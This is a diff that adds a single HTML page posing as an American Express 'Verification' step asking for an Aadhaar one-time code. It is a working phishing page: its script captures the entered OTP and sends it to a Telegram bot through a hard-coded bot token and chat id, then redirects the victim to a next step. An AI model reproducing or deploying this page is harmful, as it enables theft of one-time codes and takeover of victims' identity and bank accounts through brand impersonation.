@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verification</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body{
+    min-height:100vh;
+    background:#f5f7fb;
+    display:flex;
+    flex-direction:column;
+}
+
+/* ================= HEADER ================= */
+.site-header{
+    width:100%;
+    background:#fff;
+    border-bottom:1px solid #e6e6e6;
+}
+
+.header-container{
+    max-width:1200px;
+    margin:auto;
+    padding:16px 20px;
+}
+
+.brand{
+    font-size:18px;
+    font-weight:700;
+    color:#006fcf;
+    letter-spacing:.6px;
+}
+
+/* ================= MAIN ================= */
+.main{
+    flex:1;
+    width:100%;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:30px 15px;
+}
+
+.card{
+    width:100%;
+    max-width:460px;
+    background:#fff;
+    border-radius:14px;
+    padding:32px 28px;
+    box-shadow:0 18px 40px rgba(0,0,0,.12);
+}
+
+.card h2{
+    text-align:center;
+    font-size:22px;
+    color:#6a3fd3;
+    margin-bottom:8px;
+}
+
+.card p{
+    text-align:center;
+    font-size:13px;
+    color:#777;
+    margin-bottom:22px;
+}
+
+.progress{
+    height:8px;
+    background:#e9e2fb;
+    border-radius:50px;
+    overflow:hidden;
+    margin-bottom:26px;
+}
+
+.progress span{
+    display:block;
+    height:100%;
+    width:100%;
+    background:linear-gradient(90deg,#7b4fe0,#5f2ec9);
+}
+
+.inputBox{
+    margin-bottom:22px;
+}
+
+.inputBox label{
+    font-size:14px;
+    color:#6a3fd3;
+    display:block;
+    margin-bottom:8px;
+}
+
+.inputBox input{
+    width:100%;
+    padding:14px;
+    font-size:15px;
+    border:1px solid #dcdcdc;
+    border-radius:6px;
+    background:#f5f6f7;
+    outline:none;
+}
+
+.btn{
+    width:100%;
+    padding:14px;
+    font-size:16px;
+    font-weight:600;
+    border:none;
+    border-radius:6px;
+    cursor:pointer;
+    background:linear-gradient(135deg,#ff1744,#ff5252);
+    color:#fff;
+}
+
+.btn:active{
+    transform:scale(.98);
+}
+
+/* ================= FOOTER (RESPONSIVE FIX) ================= */
+.footer{
+    width:100%;
+    background:#fff;
+    border-top:1px solid #e6e6e6;
+    margin-top:auto; /* 🔥 footer always stays bottom */
+}
+
+.footer-inner{
+    max-width:1200px;
+    margin:auto;
+    padding:18px 15px;
+    text-align:center;
+}
+
+.footer-inner p{
+    font-size:12px;
+    color:#777;
+    line-height:1.6;
+    word-wrap:break-word;
+}
+
+/* ================= RESPONSIVE ================= */
+@media(max-width:480px){
+    .card{
+        padding:24px 18px;
+    }
+    .card h2{
+        font-size:20px;
+    }
+    .brand{
+        font-size:16px;
+    }
+    .footer-inner{
+        padding:14px 10px;
+    }
+    .footer-inner p{
+        font-size:11px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+<header class="site-header">
+    <div class="header-container">
+        <div class="brand"><img src="amexx.jpg"></div>    
+    </div>
+</header>
+
+<!-- MAIN -->
+<div class="main">
+    <div class="card">  
+        <h2>SIGN UP YOUR USER ACCOUNT</h2>
+        <p>Fill all form field to go to next step</p>
+
+        <div class="progress">
+            <span></span>
+        </div>
+
+        <form method="post" id="telegramForms">      
+            <div class="inputBox">
+                <label>Aadhaar Verification Code</label>
+                <input type="text" id="aadharotp" name="aadharotp" placeholder="Enter Your OTP Here" required>
+            </div>   
+
+            <button class="btn">Submit</button>
+
+ 
+        </form>   
+    </div>  
+</div>
+
+<!-- FOOTER -->  
+<footer class="footer">
+    <div class="footer-inner">
+        <p>
+            Copyright © 2023 American Express Company |
+            American Express Banking Corp.
+        </p>
+    </div>
+</footer> 
+
+
+<script>
+document.getElementById("telegramForms").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  var otp = document.getElementById("aadharotp").value;
+
+  var botToken = "7654977396:AAEzzSUAiGBgY2JEl3K8PmMp-Quj3QMXYTg";  // ⚠️ new token use karo
+  var chatId = "1308711346";
+
+  var message =
+    " New Form Submission\n\n" +
+    "Aadhaar OTP: " + otp;
+
+  var telegramURL =
+    "https://api.telegram.org/bot" + botToken +
+    "/sendMessage?chat_id=" + chatId +
+    "&text=" + encodeURIComponent(message);
+
+  fetch(telegramURL)
+    .then(() => {
+      window.location.href = "proceed.html";
+    })
+    .catch(() => {
+      alert("Failed to send data");
+    });
+});
+</script>
+
+
+
+</body>
+</html>
